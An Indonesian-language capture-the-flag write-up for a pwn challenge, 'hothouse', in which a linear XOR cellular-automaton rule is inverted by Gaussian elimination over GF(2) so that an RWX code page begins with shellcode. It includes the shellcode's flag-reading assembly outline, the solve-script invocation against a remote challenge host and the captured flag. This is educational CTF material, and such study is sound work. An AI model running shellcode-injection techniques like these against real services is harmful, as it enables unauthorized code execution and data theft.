# Hothouse

## Ringkasan

Binary `hothouse` adalah service kontrol untuk lattice 32x32. User tidak bisa menulis byte executable secara langsung. User cuma bisa menyalakan cell seed lewat `SEED`, lalu `INCUBATE` akan menumbuhkan seed itu menjadi fabric 128 byte. Fabric tersebut kemudian dieksekusi oleh `FIRE`.

Bug/kelemahannya ada di desainnya: growth rule bersifat linear XOR. Dengan membaca fabric dari seed kosong memakai `PROBE`, kita bisa menghilangkan bagian random/substrate instance. Setelah itu seed bisa dihitung balik supaya prefix fabric menjadi shellcode x86_64.

## File Challenge

```
hothouse  - ELF 64-bit static, stripped
RULE.md   - dokumentasi protokol dan layout lattice
```

`RULE.md` menjelaskan lattice 32x32 dipack little-endian menjadi 128 byte:

```
cell (r, c) -> bit (c & 7) of byte r*4 + (c >> 3)
```

Command penting:

```
SEED r c
INCUBATE
PROBE r c
RENDER
FIRE
```

## Analisis Awal

Binary static dan stripped, tapi string command masih jelas:

```
SEED %d %d
INCUBATE
PROBE %d %d
RENDER
FIRE
```

Dari disassembly fungsi utama:

- Program membuat mapping `mmap` 0x2000 byte.
- Page kedua dibuat `RWX` dan dipakai sebagai executable fabric.
- Path flag dari `FLAGPATH` atau fallback `/flag_0000000000000000` dicopy ke page pertama di offset random.
- `FIRE` memasang seccomp lalu call langsung ke page fabric.

Seccomp masih mengizinkan syscall yang cukup untuk baca flag:

```
read      = 0
write     = 1
mmap      = 9
exit      = 60
openat    = 257
exit_group= 231
```

Jadi shellcode cukup melakukan:

1. Cari string `/flag` di page sebelum code page.
2. `openat(AT_FDCWD, path, O_RDONLY)`.
3. `read(fd, buf, 0x100)`.
4. `write(1, buf, n)`.
5. `exit(0)`.

## Analisis Static / Dynamic

Fungsi `INCUBATE` ada di sekitar `0x403800`. Rule-nya menjalankan 7 generasi.

Offset tetangga yang dipakai:

```
NEIGH = [
    (-1, 0),
    ( 1, 0),
    ( 0, 1),
    ( 0,-1),
    (-1, 1),
    ( 1,-1),
]
```

Untuk setiap cell:

```
next[r][c] = substrate[r][c]
             XOR prev[r-1][c]
             XOR prev[r+1][c]
             XOR prev[r][c+1]
             XOR prev[r][c-1]
             XOR prev[r-1][c+1]
             XOR prev[r+1][c-1]
```

Cell di luar lattice dianggap dead.

Karena semuanya XOR, hasil akhir punya bentuk affine:

```
fabric = A * seed XOR zero_fabric
```

`zero_fabric` bisa dibaca per instance dengan:

```
INCUBATE
PROBE r 0
PROBE r 8
PROBE r 16
PROBE r 24
```

untuk semua row `0..31`.

Setelah itu solver menghitung seed untuk membuat prefix fabric sama dengan shellcode.

## Algoritma Validasi atau Encoding

Tidak ada validasi flag klasik. Program mengeksekusi fabric yang sudah settled.

Kunci solving:

1. Bangun matriks linear `A` dari rule CA 7 generasi, tanpa substrate.
2. Ambil `zero_fabric` dari service instance.
3. Hitung persamaan prefix:

```
A_prefix * seed = shellcode_prefix XOR zero_fabric_prefix
```

4. Selesaikan dengan Gaussian elimination GF(2).
5. Kirim semua bit seed yang bernilai 1 memakai `SEED r c`.
6. Jalankan `INCUBATE` lagi.
7. Jalankan `FIRE`.

Seluruh 128 byte fabric tidak perlu dipaksa menjadi shellcode. Cukup prefix shellcode saja, karena shellcode akan `exit` sebelum menyentuh suffix. Ini penting karena matriks full 1024 bit punya rank 992, jadi tidak semua fabric arbitrary bisa digrow.

## Penyusunan Solve Script

`solve.py` melakukan semua langkah otomatis:

```
python3 solve.py --remote pwn.h7tex.com 40757
```

Untuk test lokal dengan binary:

```
python3 solve.py --local ./hothouse
```

Shellcode yang dipakai:

```
lea rbx, [rip]
and rbx, -4096
sub rbx, 4096

scan:
    cmp dword ptr [rbx], 0x616c662f ; "/fla"
    je found
    inc rbx
    jmp scan

found:
    openat(AT_FDCWD, rbx, 0)
    read(fd, buf, 0x100)
    write(1, buf, n)
    exit(0)
```

## Flag

Solver dijalankan ke service remote:

```
python3 solve.py --remote pwn.h7tex.com 40757
```

Output remote menghasilkan flag valid:

```
<FLAG>H7CTF{49bf88ad-937b-4932-a095-d730baa5a6a6}</FLAG>
```

Flag akhir:

```
H7CTF{49bf88ad-937b-4932-a095-d730baa5a6a6}
```

